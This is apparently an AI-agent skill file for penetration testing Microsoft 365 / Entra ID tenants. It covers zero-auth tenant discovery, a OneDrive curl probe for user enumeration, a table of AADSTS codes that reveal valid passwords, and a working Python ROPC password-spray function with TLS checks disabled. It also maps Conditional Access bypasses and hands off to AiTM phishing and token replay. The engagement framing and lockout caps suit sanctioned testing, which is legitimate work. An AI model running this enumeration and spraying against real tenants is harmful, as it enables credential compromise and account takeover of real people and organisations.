---
name: hunt-m365
description: Microsoft 365 / Entra ID attack - tenant discovery, user enumeration via OneDrive differential (2026 verified), AADSTS code reference, Smart Lockout math (hard cap 1-2 attempts/user), ROPC validation, Conditional Access mapping. Wiki-first, FIND schema output.
---

# Hunt: M365 / Entra ID

**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration limits, stop conditions, wiki protocol, FIND output, and Deadends. Do not re-derive any of that here.

## Wiki

```
qmd_query "Microsoft 365 Entra ID Azure AD tenant discovery user enumeration OneDrive AADSTS smart lockout conditional access ROPC" via wiki-search MCP
```

Hub: [[cloud-moc]] (live index). Primary page: [[azure-ad-enumerate]].
Anchors: [[azure-ad-conditional-access-policy]] (the CA gap you must prove bypassed), [[azure-ad-access-and-tokens]] (ROPC / token issuance).

## Attack surface (ranked - spend the zero-auth signal before any auth attempt)

**Fingerprint (target is M365/Entra) when you see:** `*.onmicrosoft.com`, `*-my.sharepoint.com`, `login.microsoftonline.com` redirects, `enterpriseregistration.*` records, or "Microsoft 365" in tech-stack notes.

1. **Tenant discovery** - zero auth, zero lockout. Namespace type, tenant ID, SharePoint presence.
2. **User enumeration via OneDrive differential** - zero auth, zero lockout. Build the full user list here; it costs nothing against the lockout counter, so do it exhaustively before touching auth.
3. **Auth (ROPC) - LAST, and hard-capped.** Only after 1 and 2 are done. This is the ONLY step that burns the Smart Lockout budget: at most 1-2 attempts per user, ever. See the math below; the ROPC helper enforces it.

## AADSTS Code Reference (Memorize)

| Code | Meaning | Lockout hit? | Action |
|------|---------|-------------|--------|
| 50034 | User does not exist | NO | Skip - remove from spray list |
| 50126 | Wrong password | YES (+1) | User exists - try alternate later |
| 50053 | Account locked (Smart Lockout) | n/a | Pre-existing lockout - flag to client; do NOT retry |
| 53003 | CA blocked token issuance | YES (+1) | **PASSWORD VALID** |
| 50076 | MFA required | YES (+1) | **PASSWORD VALID** |
| 50079 | Strong auth required | YES (+1) | **PASSWORD VALID** |
| 50158 | External auth required | YES (+1) | **PASSWORD VALID** |
| 530003 | Device-state required | YES (+1) | **PASSWORD VALID** |

Codes {53003, 50076, 50079, 50158, 530003} = password confirmed valid. Microsoft only returns these AFTER credential validation.

## Smart Lockout Math (Hard Cap Discipline)
- Default: 10 failed attempts in 10 min -> lockout
- Counter shared across ALL flows (ROPC + SAML + IMAP + EWS)
- **Hard cap: <=1-2 password attempts per user per engagement**
- With 1 attempt/user, lockout is mathematically impossible
- Any AADSTS50053 = pre-existing lockout from another actor

This cap is stricter than the `hunt-core` generic enumeration ceiling and overrides it. Never batch a password list against a user, never loop the ROPC helper without its per-email attempt file, and never re-run a user that already spent its attempt. If a step would exceed 1-2 attempts/user, stop and reduce it.

## Tenant Discovery
```bash
msftrecon -d client.example
# Key fields: Tenant ID, Namespace Type (Managed = ROPC works | Federated = ADFS)
# SharePoint Detected: Yes -> OneDrive enum available
```

## User Enumeration (OneDrive Differential - Verified May 2026)
```bash
# 200 with ~57KB body = user EXISTS (licensed)
# 404 with 0 bytes = user DOES NOT EXIST
curl -sk "https://<tenant>-my.sharepoint.com/personal/<user>_<domain>_com/_layouts/15/onedrive.aspx"

# Zero auth attempts -- zero lockout impact
```

Signal: OneDrive 404 + ROPC AADSTS50126 = functional/shared mailbox account (no OneDrive license, has password) = prime target for spray (historically MFA-exempt).

## ROPC Validation (Single-Attempt Pattern)
`HARD_CAP = 1` is load-bearing, not a default. The per-email attempt file is what keeps step 3 inside the Smart Lockout math above - do not remove it, do not raise the cap, do not call `attempt()` in a bare list loop.
```python
import urllib.request, urllib.parse, ssl, json, os

HARD_CAP = 1  # Never higher
ATTEMPT_FILE = "engagement_log/o365_attempts.json"

def attempt(email, password):
    state = json.load(open(ATTEMPT_FILE)) if os.path.exists(ATTEMPT_FILE) else {}
    if state.get(email.lower(), 0) >= HARD_CAP:
        return {"status": "SKIPPED_CAP"}
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    body = urllib.parse.urlencode({
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "client_info": "1",
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "openid",
    }).encode()
    
    req = urllib.request.Request(
        "https://login.microsoftonline.com/common/oauth2/token",
        data=body,
        method="POST"
    )
    
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=15)
        result = json.loads(resp.read())
        token_result = {"status": "VALID_TOKEN", "token": result.get("access_token","")[:20]+"..."}
    except urllib.error.HTTPError as e:
        err = json.loads(e.read())
        code = err.get("error_codes", [0])[0]
        token_result = {"status": "ERROR", "code": code, "desc": err.get("error_description","")[:80]}
    
    state[email.lower()] = state.get(email.lower(), 0) + 1
    with open(ATTEMPT_FILE, "w") as f:
        json.dump(state, f)
    
    return token_result
```

## Conditional Access Mapping
After finding valid credential (AADSTS53003/50076/etc), document CA policy:
- Note which client_id variants are tried (Graph PS, Azure CLI, Office)
- Note if CA is per-app or universal
- If universal CA: document as "valid credential, external access blocked by CA - phishing/AiTM required for exploitation"

## Confirmation gate

M365/Entra specific. Adds to the `hunt-core` gate, does not replace it.

**NOT confirmation:** a valid username from OneDrive enumeration alone (200 / ~57KB body proves the account exists and is licensed, never that it is accessible); an AADSTS error code read in isolation - especially AADSTS50126 (wrong password: proves only that the user EXISTS) and AADSTS50034 (no user). An error code is not a token. A "CA bypass" inferred from a block code (AADSTS53003) without an actually issued access token - 53003 proves the password, it does NOT prove you got past Conditional Access.

**IS confirmation - valid credential:** ROPC returns an `access_token` (`VALID_TOKEN`), OR the login returns one of the strictly-post-validation codes {53003, 50076, 50079, 50158, 530003} (Microsoft emits these only after the password checks out; password confirmed, access gated by MFA/CA). Reproduced.

**IS confirmation - Conditional Access bypass:** an `access_token` actually obtained through a client_id / flow the policy fails to cover (not merely a 53003 on one client), reproduced in a clean run.

## Chaining

Confirmed credential + obtained token -> hand off to `hunt-cloud` (Azure / Graph post-auth enumeration) or `hunt-federation` (AiTM / token replay when CA blocks direct ROPC). A Federated namespace (ADFS) -> `hunt-auth` legacy-protocol matrix instead of ROPC.

## Severity

| Outcome | Severity |
|---|---|
| CA bypassed and access token obtained (data / Graph access) | critical |
| Valid password confirmed but MFA / CA blocks token issuance | high |
| Unauthenticated user-enum / no rate-limit endpoint (enables spray) | high |

Distill (when confirmed): reusable CA bypass or OneDrive enumeration method, GENERIC, no client host -> `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/cloud/azure-ad-enumerate.md` (CA bypass: `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/cloud/azure-ad-conditional-access-policy.md`).
